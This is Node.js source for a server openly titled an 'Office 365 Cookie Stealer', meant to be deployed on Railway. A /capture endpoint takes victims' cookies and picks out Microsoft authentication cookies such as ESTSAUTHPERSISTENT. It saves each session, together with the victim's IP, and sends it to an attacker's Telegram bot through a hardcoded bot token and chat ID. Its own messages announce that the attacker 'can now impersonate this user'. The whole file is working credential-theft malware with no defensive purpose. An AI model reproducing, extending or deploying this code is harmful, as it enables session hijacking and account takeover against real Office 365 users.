// =============================================
// OFFICE 365 COOKIE STEALER - RAILWAY VERSION
// =============================================

const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const cors = require('cors');
const fetch = require('node-fetch');  // ← ADDED!
const app = express();
const PORT = process.env.PORT || 3000;

// =============================================
// ⚠️ CONFIGURATION - UPDATE THESE!
// =============================================
const CONFIG = {
    botToken: '8730465777:AAHmQqHT-aPYbAtxItqtDSAtoeGhcXIv-4g',  // ← PUT YOUR REAL TOKEN
    chatId: '7075480337'       // ← PUT YOUR REAL CHAT ID
};

// =============================================
// MIDDLEWARE
// =============================================
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

// =============================================
// CREATE STORAGE
// =============================================
const STORAGE_DIR = './captured_sessions';
fs.ensureDirSync(STORAGE_DIR);
console.log(`✅ Storage created: ${STORAGE_DIR}/`);

// =============================================
// TELEGRAM SENDER - FIXED!
// =============================================
async function sendToTelegram(message, fileData = null) {
    try {
        console.log('📤 Sending to Telegram...');
        console.log('📝 Message length:', message.length);
        
        // Send text message
        const textResponse = await fetch(
            `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            }
        );
        
        const textResult = await textResponse.text();
        console.log('📤 Text response:', textResult.substring(0, 200));
        
        // Send file if provided
        if (fileData) {
            const { default: FormData } = await import('form-data');
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            formData.append(
                'document',
                JSON.stringify(fileData, null, 2),
                `session_${Date.now()}.json`
            );
            formData.append('caption', '📸 Captured Session Data - Office 365');
            
            const fileResponse = await fetch(
                `https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`,
                {
                    method: 'POST',
                    body: formData
                }
            );
            
            const fileResult = await fileResponse.text();
            console.log('📤 File response:', fileResult.substring(0, 200));
        }
        
        console.log('✅ Telegram sent successfully!');
        return true;
        
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        console.error('❌ Stack:', error.stack);
        return false;
    }
}

// =============================================
// EXTRACT COOKIES
// =============================================
function extractCookies(headers) {
    const cookieHeader = headers['cookie'] || headers['Cookie'] || '';
    const cookies = {};
    
    if (cookieHeader) {
        const parts = cookieHeader.split(';');
        for (const part of parts) {
            const trimmed = part.trim();
            if (trimmed) {
                const [name, ...valueParts] = trimmed.split('=');
                cookies[name] = valueParts.join('=');
            }
        }
    }
    
    return cookies;
}

// =============================================
// EXTRACT OFFICE 365 COOKIES
// =============================================
function extractOfficeCookies(cookies) {
    const officeCookies = {};
    const targetNames = [
        'ESTSAUTHPERSISTENT',
        'ESTSAUTH',
        'ESTSAUTHLIGHT',
        'SignInState',
        'SignInPolicy',
        'LoginOptions',
        'MSTeams',
        'MSA',
        'AAD',
        'Microsoft',
        'Office',
        'Outlook',
        'SharePoint'
    ];
    
    for (const [name, value] of Object.entries(cookies)) {
        for (const target of targetNames) {
            if (name.includes(target) || name.toUpperCase().includes(target.toUpperCase())) {
                officeCookies[name] = value;
                break;
            }
        }
    }
    
    return officeCookies;
}

// =============================================
// CAPTURE ENDPOINT
// =============================================
app.post('/capture', async (req, res) => {
    console.log('\n🎯 COOKIE CAPTURED!');
    
    const data = req.body;
    const timestamp = new Date().toISOString();
    
    const cookies = extractCookies(data.headers || {});
    const officeCookies = extractOfficeCookies(cookies);
    const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
    
    console.log(`🍪 Total cookies: ${Object.keys(cookies).length}`);
    console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
    
    if (hasFullSession) {
        console.log('🔥 FULL OFFICE 365 SESSION CAPTURED!');
    }
    
    // Save to file
    const sessionData = {
        timestamp: timestamp,
        url: data.url || 'unknown',
        userAgent: data.headers?.['user-agent'] || data.headers?.['User-Agent'] || 'unknown',
        cookies: cookies,
        officeCookies: officeCookies,
        hasFullSession: hasFullSession,
        ip: req.ip || req.connection.remoteAddress,
        rawData: data
    };
    
    const filename = `session_${Date.now()}.json`;
    const filepath = path.join(STORAGE_DIR, filename);
    fs.writeJsonSync(filepath, sessionData, { spaces: 2 });
    console.log(`📁 Saved: ${filename}`);
    
    // =============================================
    // ONLY SEND IF OFFICE COOKIES FOUND
    // =============================================
    if (Object.keys(officeCookies).length > 0 || hasFullSession) {
        console.log('🔥 OFFICE 365 TOKENS FOUND! Sending to Telegram...');
        
        // Build message
        let message = '🎯 <b>Office 365 Cookie Capture!</b>\n\n';
        message += `📅 <b>Time:</b> ${timestamp}\n`;
        message += `🌐 <b>URL:</b> ${data.url || 'Unknown'}\n\n`;
        message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
        message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
        
        if (hasFullSession) {
            message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
            message += '✅ You can now impersonate this user!\n\n';
        }
        
        if (Object.keys(officeCookies).length > 0) {
            message += '\n🔑 <b>Critical Office Cookies:</b>\n';
            for (const [name, value] of Object.entries(officeCookies)) {
                const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
                message += `• ${name}: ${shortValue}\n`;
            }
        }
        
        await sendToTelegram(message, sessionData);
        
    } else {
        console.log('❌ No Office 365 tokens found. Nothing sent to Telegram.');
        console.log('💡 Victim was NOT logged into Office 365.');
    }
    
    res.json({
        success: true,
        captured: Object.keys(cookies).length,
        officeCookies: Object.keys(officeCookies).length,
        hasFullSession: hasFullSession
    });
});

// =============================================
// VIEW SESSIONS
// =============================================
app.get('/sessions', (req, res) => {
    const files = fs.readdirSync(STORAGE_DIR);
    const sessions = [];
    
    for (const file of files) {
        try {
            const data = fs.readJsonSync(path.join(STORAGE_DIR, file));
            sessions.push({
                file: file,
                timestamp: data.timestamp,
                url: data.url,
                cookieCount: Object.keys(data.cookies || {}).length,
                officeCount: Object.keys(data.officeCookies || {}).length,
                hasFullSession: data.hasFullSession || false
            });
        } catch (e) {}
    }
    
    res.json(sessions);
});

// =============================================
// SERVE DASHBOARD
// =============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/injector.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'injector.html'));
});

// =============================================
// START SERVER
// =============================================
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔥 OFFICE 365 COOKIE STEALER                             ║
║   🎯 Running on Railway!                                   ║
║                                                              ║
║   📡 Port: ${PORT}                                           ║
║   📁 Captures: ${STORAGE_DIR}/                               ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `);
});
